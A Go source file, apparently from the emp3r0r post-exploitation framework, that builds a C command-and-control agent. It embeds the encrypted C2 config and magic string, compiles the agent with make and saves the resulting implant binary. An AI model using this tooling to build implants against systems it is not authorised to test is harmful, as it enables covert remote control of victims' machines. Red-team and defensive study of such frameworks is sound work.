package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/cagent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// C agent provider choices select which backend the on-demand Makefile links
// (see core/c_agent/Makefile). They mirror the Makefile's <GROUP>=<name>
// model; the default for each group is the first entry.
var (
	CAgentCryptoProviders    = []string{"openssl", "mbedtls"}
	CAgentGzipProviders      = []string{"miniz", "none"}
	CAgentHTTPProviders      = []string{"libcurl"}
	CAgentTransportProviders = []string{"http_poll"}
)

// CAgentProviders selects the providers the built C agent links. Empty fields
// keep the Makefile default.
type CAgentProviders struct {
	Crypto    string // CRYPTO=
	Gzip      string // GZIP=
	HTTP      string // HTTP=
	Transport string // TRANSPORT=
}

// cAgentSourceDir is the on-demand C agent source shipped with the operator kit
// (core/build.py copies core/c_agent to <prefix>/lib/emp3r0r/c_agent).
func cAgentSourceDir() string {
	return filepath.Join(live.EmpDataDir, "c_agent")
}

func validateCAgentProviders(p CAgentProviders) error {
	check := func(group, value string, allowed []string) error {
		if value == "" {
			return nil
		}
		for _, a := range allowed {
			if a == value {
				return nil
			}
		}
		return fmt.Errorf("invalid %s provider %q (available: %v)", group, value, allowed)
	}
	if err := check("crypto", p.Crypto, CAgentCryptoProviders); err != nil {
		return err
	}
	if err := check("gzip", p.Gzip, CAgentGzipProviders); err != nil {
		return err
	}
	if err := check("http", p.HTTP, CAgentHTTPProviders); err != nil {
		return err
	}
	return check("transport", p.Transport, CAgentTransportProviders)
}

// cAgentBuildArgs is the deterministic `make` argument vector for the on-demand
// agent build. configSrc is the Go-rendered C translation unit carrying the
// encrypted config and magic string (see cagent.EmbeddedConfigSource). Kept
// pure so it can be unit tested without invoking make.
func cAgentBuildArgs(srcDir, configSrc string, p CAgentProviders) []string {
	args := []string{
		"-C", srcDir, "agent",
		"CONFIG_SRC=" + configSrc,
	}
	if p.Crypto != "" {
		args = append(args, "CRYPTO="+p.Crypto)
	}
	if p.Gzip != "" {
		args = append(args, "GZIP="+p.Gzip)
	}
	if p.HTTP != "" {
		args = append(args, "HTTP="+p.HTTP)
	}
	if p.Transport != "" {
		args = append(args, "TRANSPORT="+p.Transport)
	}
	return args
}

// GenerateCAgentWorkflow builds core/c_agent's reference agent. It reuses the
// Go generator's config plumbing (MakeConfig + EncryptAgentConfig), so the
// embedded config is encrypted under the same MagicString the C2 is using and
// the C agent talks to exactly the same C2.
func GenerateCAgentWorkflow(opts AgentConfig, providers CAgentProviders, signAgentFn func(uuid string) (string, error)) (*BuildAgentResult, error) {
	if err := validateCAgentProviders(providers); err != nil {
		return nil, err
	}
	if err := MakeConfig(opts); err != nil {
		return nil, fmt.Errorf("configure agent: %w", err)
	}

	srcDir := cAgentSourceDir()
	if !util.IsFileExist(filepath.Join(srcDir, "Makefile")) {
		return nil, fmt.Errorf("C agent source not found at %s (rebuild the operator kit)", srcDir)
	}

	agentUUID := uuid.NewString()
	var sig string
	var err error
	if signAgentFn != nil {
		sig, err = signAgentFn(agentUUID)
		if err != nil {
			return nil, fmt.Errorf("sign agent UUID: %w", err)
		}
	}

	// Encrypted CBOR config, byte-identical to what a Go agent would carry.
	payload, _, err := EncryptAgentConfig(AgentBuildConfig{
		AgentUUID:    agentUUID,
		AgentUUIDSig: sig,
	})
	if err != nil {
		return nil, fmt.Errorf("encrypt config: %w", err)
	}

	// The C agent's build-time data (encrypted config + magic string) is
	// rendered as a C translation unit into the Makefile's build directory,
	// which is gitignored, then compiled via CONFIG_SRC so building the agent
	// needs no Python or Go toolchain on the operator host.
	buildDir := filepath.Join(srcDir, "build")
	if err := os.MkdirAll(buildDir, 0o755); err != nil {
		return nil, fmt.Errorf("create build dir: %w", err)
	}
	configSrcPath := filepath.Join(buildDir, "c2_config_embedded.c")
	if err := os.WriteFile(configSrcPath, cagent.EmbeddedConfigSource(payload, def.MagicString), 0o600); err != nil {
		return nil, fmt.Errorf("write config source: %w", err)
	}

	// Build with the pinned zig toolchain the kit ships (the Makefile default).
	build := exec.Command("make", cAgentBuildArgs(srcDir, configSrcPath, providers)...)
	build.Dir = srcDir
	if out, buildErr := build.CombinedOutput(); buildErr != nil {
		return nil, fmt.Errorf("build C agent: %w\n%s", buildErr, out)
	}

	built := filepath.Join(srcDir, "build", "c2_agent")
	if !util.IsFileExist(built) {
		return nil, fmt.Errorf("build reported success but %s was not produced", built)
	}
	now := time.Now()
	outFile := filepath.Join(live.EmpWorkSpace, fmt.Sprintf("aquila_linux_%d-%d-%d_%d-%d-%d",
		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()))
	data, err := os.ReadFile(built)
	if err != nil {
		return nil, fmt.Errorf("read built C agent: %w", err)
	}
	if err := os.WriteFile(outFile, data, 0o755); err != nil {
		return nil, fmt.Errorf("write C agent: %w", err)
	}

	return &BuildAgentResult{
		StubFile:   srcDir,
		OutputFile: outFile,
		AgentUUID:  agentUUID,
		ConfigSize: len(payload),
	}, nil
}
